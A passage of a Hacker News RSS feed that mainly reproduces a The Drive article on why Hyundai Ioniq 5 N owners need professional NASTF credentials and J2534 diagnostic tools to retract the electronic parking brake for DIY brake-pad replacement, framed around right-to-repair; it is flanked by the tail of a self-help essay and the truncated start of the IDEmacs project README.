badly-engineered life.</span></p><p><span>I‚Äôd recommend assuming there‚Äôs some area of your life where you are, without realizing it, frozen in time, and that locating it matters quite a bit. Look across the three theaters of your life: work, relationships, and self-relationship, and take note of the biggest issues you face. Know that you might be looking for something that doesn‚Äôt feel like an </span><em>issue </em><span>‚Äî it might just feel like sadness or anger</span><em>, </em><span>like the sadness of not being seen, or the frustration of not feeling like your work is meaningful. Once you‚Äôve surfaced something, ask yourself: Have I done my best to come up with a set of potential solutions, using all the resources I have? Am I doing as well by myself as I would by any friend who came to me with the same problem? How do I know I‚Äôm Actually Trying?</span></p><p><em><strong><a href="https://mailchi.mp/44578760e686/book-preorder-signup" rel="">Sign up to be notified</a><span> when my book, You Can Just Do Things, is available for purchase.</span></strong></em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hyundai Paywalls Brake Pads replacement on Ioniq 5 N (208 pts)]]></title>
            <link>https://www.thedrive.com/news/replacing-brake-pads-on-a-hyundai-ioniq-5-n-requires-a-professional-mechanics-login</link>
            <guid>45942518</guid>
            <pubDate>Sun, 16 Nov 2025 03:29:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thedrive.com/news/replacing-brake-pads-on-a-hyundai-ioniq-5-n-requires-a-professional-mechanics-login">https://www.thedrive.com/news/replacing-brake-pads-on-a-hyundai-ioniq-5-n-requires-a-professional-mechanics-login</a>, See on <a href="https://news.ycombinator.com/item?id=45942518">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-6573173">

		
												<div>
						<figure>
							<p><img src="https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?quality=85&amp;w=1920" srcset="https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=50&amp;h=28 50w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=280&amp;h=158 280w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=289&amp;h=163 289w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=308&amp;h=173 308w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=370&amp;h=208 370w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=384&amp;h=216 384w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=580&amp;h=326 580w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=660&amp;h=371 660w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=704&amp;h=396 704w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=711&amp;h=400 711w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=768&amp;h=432 768w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1024&amp;h=576 1024w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1152&amp;h=648 1152w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1234&amp;h=694 1234w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1250&amp;h=703 1250w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1337&amp;h=752 1337w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1440&amp;h=810 1440w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1486&amp;h=836 1486w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1536&amp;h=864 1536w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg?w=1819&amp;h=1023 1819w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-N-side-view.jpg 1920w" sizes="(max-width: 1920px) 100vw, 1920px" fetchpriority="high" width="1920" height="1080" alt="Hyundai Ioniq 5 N in a garage">

	</p>
															<p>
									<figcaption> <em>Hyundai</em></figcaption>
								</p>
													</figure>
											</div>
												<div data-module="TableOfContents">
						<div>
							<h2> <p>The biggest car news and reviews, no BS</p>
 </h2>
										<p>Our free daily newsletter sends the stories that really matter directly to you, every weekday.</p>
						
							
					</div>

<p>A <a href="https://www.thedrive.com/car-reviews/2025-hyundai-ioniq-5-n-review-a-racing-sim-you-can-drive-on-the-road" target="_blank">2025 Hyundai Ioniq 5 N</a> owner was venting on Reddit recently about not being able to change his brake pads without specialized computer equipment. It sounds insane, but this is what new-car ownership is like in 2025. We did some digging and made contact with <a href="https://www.thedrive.com/category/hyundai-news" target="_blank">Hyundai</a> to understand the situation and break it down for you‚Äîit‚Äôs a frustrating one.</p>



<p>Having to talk to computers to fix a car isn‚Äôt necessarily unique to the Korean automaker, but I fell into a rabbit hole of Hyundai maintenance research here, so that‚Äôll be our focus for the moment.</p>



<p>Context for casual readers: Brake pad and rotor replacements are super basic car maintenance. You won‚Äôt need to do the job nearly as often on an electric car (thanks to regenerative braking), but even EV pads don‚Äôt last forever. On most cars, part of the job involves disconnecting or retracting the parking brake, which usually grabs the rear wheels. Many modern cars, and all EVs, have an electronic parking brake controlled by a computer signal, rather than a manually adjustable nut-and-cable situation. This is what sparked <a href="https://www.reddit.com/r/Ioniq5N/comments/1ojjp6m/hyundai_declares_war_on_right_to_repair/" rel="nofollow noreferrer" target="_blank">Redditor u/SoultronicPear‚Äôs justifiable frustration</a>.</p>



<p>One more piece of stage-setting: Since electronic parking brakes are indeed common, many readily available diagnostic tools (pretty basic OBD scanners) can issue a retract-brake command to a car‚Äôs ECU. Still, you do need one with bi-directional test functionality. Remember that point‚Äîit will become significant again in a few paragraphs.</p>



<figure>
<figure><img decoding="async" width="1000" height="1000" loading="lazy" data-id="6573473" src="https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?strip=all&amp;quality=85" alt="Electronic parking brake handle." srcset="https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=50&amp;h=50 50w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=102&amp;h=102 102w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=192&amp;h=192 192w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=216&amp;h=216 216w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=280&amp;h=280 280w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=289&amp;h=289 289w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=308&amp;h=308 308w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=336&amp;h=336 336w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=370&amp;h=370 370w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=396&amp;h=396 396w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=400&amp;h=400 400w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=404&amp;h=404 404w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=660&amp;h=660 660w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=690&amp;h=690 690w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=694&amp;h=694 694w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=752&amp;h=752 752w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=768&amp;h=768 768w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg?w=836&amp;h=836 836w, https://www.thedrive.com/wp-content/uploads/2025/11/EPB1.jpg 1000w" sizes="auto, (max-width: 1000px) 100vw, 1000px"></figure>



<figure><img decoding="async" width="1000" height="1000" loading="lazy" data-id="6573474" src="https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?strip=all&amp;quality=85" alt="Mechanical parking brake handle." srcset="https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=50&amp;h=50 50w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=102&amp;h=102 102w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=192&amp;h=192 192w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=216&amp;h=216 216w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=280&amp;h=280 280w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=289&amp;h=289 289w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=308&amp;h=308 308w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=336&amp;h=336 336w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=370&amp;h=370 370w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=396&amp;h=396 396w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=400&amp;h=400 400w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=404&amp;h=404 404w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=660&amp;h=660 660w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=690&amp;h=690 690w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=694&amp;h=694 694w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=752&amp;h=752 752w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=768&amp;h=768 768w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg?w=836&amp;h=836 836w, https://www.thedrive.com/wp-content/uploads/2025/11/PB1.jpg 1000w" sizes="auto, (max-width: 1000px) 100vw, 1000px"></figure>
<figcaption>Wondering if your car has an electronic parking brake or a cable one? It‚Äôs very easy to tell‚Äîif you‚Äôve got a button or switch (left), it‚Äôs electronic. Parking brakes with big, satisfying handles (like on the right) are mechanical. <em>stock.adobe.com</em></figcaption></figure>



<p>Apparently, no cheap scanner option worked on the original Reddit poster‚Äôs Ioniq 5 N. That led them on a journey of attempting to access commercial-grade car-repair gear, which was ultimately fruitless.</p>



<p>You can access a Hyundai EV‚Äôs diagnostic brain using the brand‚Äôs proprietary dealership hardware and software (it‚Äôs called GDS, and it is publicly buyable but <a href="https://oemdiagnostictools.com/hyundai-gds-kds-dealer-diagnostic-tool/?setCurrencyId=1&amp;sku=GDSM-CPKITK&amp;gad_source=1&amp;gad_campaignid=17303113625&amp;gbraid=0AAAAACJ-HcmF-xGsDbkCjbcZhnreKKPE9" rel="nofollow noreferrer" target="_blank">costs about six grand</a>) or a third-party aftermarket system running a J2534 program. J2534 is an interface standard <a href="https://www.sae.org/standards/j2534-1_5_00-recommended-practice-pass-thru-vehicle-programming" rel="nofollow noreferrer" target="_blank">designed by the SAE</a> and <a href="https://www.federalregister.gov/documents/2003/06/27/03-14461/control-of-air-pollution-from-motor-vehicles-and-new-motor-vehicle-engines-revisions-to-regulations" rel="nofollow noreferrer" target="_blank">mandated by the EPA</a> that basically ensures ECUs from different car brands can speak the same language for the sake of independent repair shops.</p>



<figure><img decoding="async" width="1920" height="1080" loading="lazy" src="https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?strip=all&amp;quality=85" alt="OBD bi-directional diagnostic computer" srcset="https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=50&amp;h=28 50w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=280&amp;h=158 280w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=289&amp;h=163 289w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=308&amp;h=173 308w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=370&amp;h=208 370w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=384&amp;h=216 384w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=580&amp;h=326 580w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=660&amp;h=371 660w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=704&amp;h=396 704w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=711&amp;h=400 711w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=768&amp;h=432 768w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1024&amp;h=576 1024w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1152&amp;h=648 1152w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1234&amp;h=694 1234w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1250&amp;h=703 1250w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1337&amp;h=752 1337w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1440&amp;h=810 1440w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1486&amp;h=836 1486w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1536&amp;h=864 1536w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg?w=1819&amp;h=1023 1819w, https://www.thedrive.com/wp-content/uploads/2025/11/topdon-scanner-2-1.jpg 1920w" sizes="auto, (max-width: 1920px) 100vw, 1920px"><figcaption>Bi-directional scanners are readily available for a few hundred bucks. This <a href="https://www.amazon.com/TOPDON-Bidirectional-ArtiDiag900-Lite-Automotive/dp/B0C33Y285Y/?th=1" rel="nofollow noreferrer" target="_blank">TOPDON ArtiDiag900</a>, for example, advertises electronic parking brake controlability, but I don‚Äôt think it would pass Hyundai‚Äôs software authentication checks. <em>TOPDON</em> </figcaption></figure>



<p>Hyundai supports J2534 and <a href="https://hyundaitechinfo.com/external/files/j2534_diagnostics_and_reprogramming/J2534_Diagnostics.pdf?v=20251022" rel="nofollow noreferrer" target="_blank">recommends</a> one of three machines for talking to its cars: <a href="https://opusivs.com/product/cardaq-plus-3-kit/" rel="nofollow noreferrer" target="_blank">CarDAQ Plus 3</a> (about $2,000), <a href="https://www.bosch-mobility.com/en/solutions/diagnostics/vehicle-communication-interface/" rel="nofollow noreferrer" target="_blank">MTS 6531</a> (also about $2,000), and <a href="https://www.dgtech.com/d-bridge-pro/" rel="nofollow noreferrer" target="_blank">d-briDGe PRO</a> (about $800). ‚Äú‚Ä¶under no circumstances do we recommend the use of a non-approved J2534 device,‚Äù the company states. You would then also need a subscription to Hyundai‚Äôs J2534 Diagnostic Tool Software, which costs $60 a week (or less over longer time blocks). All this info is in .PDFs linked from <a href="https://hyundaitechinfo.com/" rel="nofollow noreferrer" target="_blank">Hyundai‚Äôs tech portal</a>.</p>



<p>At this point, after spending about $2,000 on tools, you should be able to service your own Hyundai Ioniq brakes, but if you‚Äôre a DIYer, you still can‚Äôt. Written in red at the top of one of Hyundai‚Äôs many tech documents is this: ‚ÄúAccess to Bi-Directional Tests and Special Functions require Diagnostic Professional or Vehicle Security Professional credential from NASTF.‚Äù</p>



<p><a href="https://wp.nastf.org/" rel="nofollow noreferrer" target="_blank">NASTF</a> is the National Automotive Service Task Force. It exists ‚Äúto identify and resolve gaps in service information, tool information, and training‚Äù between OEMs and independent shops (cool idea). It‚Äôs also the arbiter of things like lock coding and car credential management. To get scan-tool validation as a member, you need to be a professional mechanic.</p>



<p>And with that final roadblock, we can confirm that, no, a DIYer can not do their own brakes on a Hyundai Ioniq 5 N.</p>



<p>I‚Äôm guessing most of you reading this will now have the same thought I did‚Äîit does seem smart to have some regulation on sensitive data like the codes to your car locks, but what the heck, you should be able to do brake pads on a car you own. Or as Randy Marsh would have put it:<em> ‚ÄúI‚Äôm sorry, I thought this was America!‚Äù</em></p>



<figure><img decoding="async" width="1920" height="1080" loading="lazy" src="https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?strip=all&amp;quality=85" alt="2022 Hyundai Ioniq 5 rear brake diagram." srcset="https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=50&amp;h=28 50w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=280&amp;h=158 280w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=289&amp;h=163 289w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=308&amp;h=173 308w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=370&amp;h=208 370w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=384&amp;h=216 384w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=580&amp;h=326 580w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=660&amp;h=371 660w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=704&amp;h=396 704w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=711&amp;h=400 711w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=768&amp;h=432 768w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1024&amp;h=576 1024w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1152&amp;h=648 1152w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1234&amp;h=694 1234w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1250&amp;h=703 1250w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1337&amp;h=752 1337w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1440&amp;h=810 1440w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1486&amp;h=836 1486w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1536&amp;h=864 1536w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg?w=1819&amp;h=1023 1819w, https://www.thedrive.com/wp-content/uploads/2025/11/Hyundai-Ioniq-5-rear-brake-diagram2.jpg 1920w" sizes="auto, (max-width: 1920px) 100vw, 1920px"><figcaption>Here‚Äôs an exploded view of Ioniq 5 rear brakes. <em>Hyundai</em> </figcaption></figure>



<p>Naturally, I also dropped Hyundai a note about this directly. Here‚Äôs what the automaker told us:</p>



<p>‚ÄúHyundai is committed to supporting both our dealer network and independent repair facilities with safe, secure, and accessible service solutions. For vehicles equipped with electronic parking brakes, including the Ioniq 5 and Ioniq 5 N, the official repair procedure requires placing the rear calipers in service mode using either our Global Diagnostic System (GDS) or the J2534 application. This ensures proper functionality and customer safety. Hyundai recently expanded access through an update to our J2534 application, enabling aftermarket users to perform functions previously restricted by the GDS secure gateway. While authentication through NASTF is required for sensitive operations, this step helps maintain security and accountability. Our official dealer tool (GDS) is also available for purchase by anyone.</p>



<p>Hyundai is actively exploring ways to make routine maintenance easier for all customers while upholding safety standards.</p>



<p>‚ÄúWe appreciate the interest in DIY repairs and will continue working toward solutions that balance convenience with security.‚Äù</p>



<figure><img decoding="async" width="1920" height="1080" loading="lazy" src="https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?strip=all&amp;quality=85" alt="Rear brake caliper." srcset="https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=50&amp;h=28 50w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=280&amp;h=158 280w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=289&amp;h=163 289w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=308&amp;h=173 308w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=370&amp;h=208 370w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=384&amp;h=216 384w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=580&amp;h=326 580w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=660&amp;h=371 660w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=704&amp;h=396 704w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=711&amp;h=400 711w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=768&amp;h=432 768w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1024&amp;h=576 1024w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1152&amp;h=648 1152w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1234&amp;h=694 1234w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1250&amp;h=703 1250w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1337&amp;h=752 1337w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1440&amp;h=810 1440w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1486&amp;h=836 1486w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1536&amp;h=864 1536w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg?w=1819&amp;h=1023 1819w, https://www.thedrive.com/wp-content/uploads/2025/11/parking-brake-showing.jpg 1920w" sizes="auto, (max-width: 1920px) 100vw, 1920px"><figcaption>Here‚Äôs a rear brake caliper. See that little hook I put an orange arrow pointed at? That‚Äôs the parking brake engager. If you were changing pads and rotors on this car, you‚Äôd probably disconnect that cable to get the caliper off, then screw the piston into the caliper, then reinstall the cable and manually adjust its tightness with a nut on the cable. Modern cars have the same functionality, but you can‚Äôt mess with it without computer control. <em>stock.adobe.com</em> </figcaption></figure>



<p>So after all that, we can address the Reddit thread title ‚Äú<a href="https://www.reddit.com/r/Ioniq5N/comments/1ojjp6m/hyundai_declares_war_on_right_to_repair/" rel="nofollow noreferrer" target="_blank">Hyundai declares WAR on Right to Repair</a>‚Äù as technically incorrect. Right-to-repair <a href="https://www.ncsl.org/technology-and-communication/right-to-repair-2023-legislation" rel="noreferrer" target="_blank">legislation</a> prevents product manufacturers from hiding technology behind proprietary diagnostic tools, and this stuff is not restricted to the brand‚Äôs own equipment. So, technically, I think the company‚Äôs in the clear on the rules as-written. We can also add a layer of clarification to the <a href="https://www.carscoops.com/2025/11/ioniq-5-n-owner-says-hyundai-wont-even-let-you-change-your-brake-pads/" rel="nofollow noreferrer" target="_blank"><em>Carscoops</em></a> post on this that was headlined as ‚ÄúApparently You Need Hyundai‚Äôs Permission To Change Your Own Brakes.‚Äù It‚Äôs not Hyundai‚Äôs permission you need, it‚Äôs the NASTF‚Äôs.</p>



<p>However, obviously, both <em>Carscoops </em>and the guy on Reddit were totally right in principle. A car repair task that has historically been totally DIY‚Äôable in a driveway is now relegated to shop-only because of technology. And that‚Äôs not good.</p>



<p>We focused on Hyundai here because this particular Reddit thread caught my eye and sent me on a research quest about this particular brand, but the Korean automaker is hardly the only company making it hard to mess with modern cars.</p>



<p>I understand, and even appreciate, automakers wanting to be careful with things like lock and engine-starting encryption. You definitely don‚Äôt want anybody to be able to download your car keys and make off with your vehicle, or do worse. But there‚Äôs got to be a better middle-ground than this. People should have unfettered access to the cars (and tractors, and tools) they own, plain and simple.</p>



<p>One last note: For anyone who found this article because you, too, are trying to get a modern car‚Äôs electronic brake to release for service but aren‚Äôt having luck ‚Ä¶ I did find <a href="https://epbrt.242925.xyz/" rel="nofollow noreferrer" target="_blank">this one tool</a> that might be able to override the existing software. But I‚Äôm making no endorsement of it whatsoever‚ÄîI‚Äôve never used it and have no idea if it works or if using it might trigger any unintended consequences. Use at your own risk (but report back in the comments if you‚Äôve tried it).</p>



<p><em>Got a tip? Drop us a line at tips@thedrive.com.</em></p>

					</div>

				

					</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[IDEmacs: A Visual Studio Code clone for Emacs (289 pts)]]></title>
            <link>https://codeberg.org/IDEmacs/IDEmacs</link>
            <guid>45941835</guid>
            <pubDate>Sun, 16 Nov 2025 00:56:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://codeberg.org/IDEmacs/IDEmacs">https://codeberg.org/IDEmacs/IDEmacs</a>, See on <a href="https://news.ycombinator.com/item?id=45941835">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="user-content-outline-text-description">
<p>IDEmacs aims to be a set of Emacs configurations which provide an out-of-the-box experience similar (if not identical) to popular GUI IDEs and editors.</p>
<p>
It is aimed at‚Ä¶</p>
<ol>
<li>Programmers coming to Emacs from other IDEs, or even first-time programmers familiar with only office applications.</li>
<li>
<p>Beginner Common Lisp and Scheme programmers, who need the functionality of Emacs (Sly/Geiser + structural editing) without having to perform unnecessary setup and without dealing with an alien style of keybindings. In other words, similar to <a href="https://portacle.github.io/" rel="nofollow">Portacle</a> or <a href="https://elephly.net/guile-studio/" rel="nofollow">Guile Studio</a>.<sup><a id="user-content-footnote-reference-1" href="#user-content-footnote-1" rel="nofollow">1</a></sup></p>
<ul>
<li>Some may say that we should improve support for Common Lisp and Scheme in other editors and IDEs instead. Still others may say that we should work on a better Lisp IDE than Emacs instead (such as Second Climacs or Lem). All great points. IDEmacs is just a band-aid for the present situation, where Emacs + Sly/Geiser is the best Lisp/Scheme IDE.</li>
</ul>
</li>
<li>Non-programmers who want a fully-featured Org, Markdown, or LaTeX editor with idiomatic shortcuts and mouse-friendly GUI.</li>
</ol>
<p>It provides‚Ä¶</p>
<ol>
<li>
<p><strong>GUI and mouse support</strong>, in addition to a keyboard-driven interface.</p>
<ul>
<li>Unlike most starter kits, we do not hide GUI elements by default.</li>
<li>
<p>We support configuration via the <code>custom</code> GUI, not just Elisp</p>
<ul>
<li>Supporting GUI and <code>custom</code> means we cannot use <code>straight</code></li>
</ul>
</li>
<li>If resources allow, we may implement new GUIs in Emacs</li>
</ul>
</li>
<li>
<p><strong>Keybindings that follow popular GUI and IDE conventions.</strong> <sup><a id="user-content-footnote-reference-2" href="#user-content-footnote-2" rel="nofollow">2</a></sup></p>
<ul>
<li>CUA mode is just the start - much more keybinding configuration is needed to provide an unsurprising experince. And that's before we even get to the IDE-specific keybindings.</li>
<li>This excludes starter kits that use Evil by default, such as Spacemacs or Doom.</li>
</ul>
</li>
<li>
<p><strong>A fully-featured, fast, and configuration-free Emacs experience</strong>, like any starter kit/distro.</p>
<ul>
<li>The configuration uses idiomatic Elisp and contains a generous amount of comments, valuable to anyone interested in learning to configure Emacs using Elisp.</li>
</ul>
</li>
</ol>
<p>Perfectly imitating the GUIs and subtle behaviour differences of IDEs is desirable, but not top priority. Given our limited resources, we aim for "good enough".</p>
<p>
We hope this gives new users a comfortable starting point, and make them more likely to stick around to discover the possibilities of Emacs' malleability, rather than being driven off by the default experience.</p>
<div id="user-content-outline-container-vscode">
<h3 id="user-content-vscode">
VSCode configuration (WIP)
</h3>
<div id="user-content-outline-text-vscode">
<p>This is the first and currently the only IDE configuration provided.</p>
<figure>
<a href="https://codeberg.org/IDEmacs/IDEmacs/media/branch/production/img/Screenshot%20from%202024-06-27%2000-51-42.png" rel="nofollow"><img src="https://codeberg.org/IDEmacs/IDEmacs/media/branch/production/img/Screenshot%20from%202024-06-27%2000-51-42.png" alt="/IDEmacs/IDEmacs/media/branch/production/img/Screenshot%20from%202024-06-27%2000-51-42.png"></a>
<figcaption>
The VSCode configuration, showing the <code>init.el</code> source with <code>vscode-dark-plus</code> theme, <code>treemacs</code>, <code>centaur-tabs</code>, <code>minimap</code>, <code>idle-highlight-mode</code>, <code>blamer</code>, <code>diff-hl</code>, and <code>breadcrumb</code>.
</figcaption>
</figure>
<p>
Currently, it brings together -</p>
<ol>
<li>VSCode Dark Plus theme</li>
<li><a href="https://github.com/Alexander-Miller/treemacs" rel="nofollow">Treemacs</a> for the sidebar file browser ("Explorer")</li>
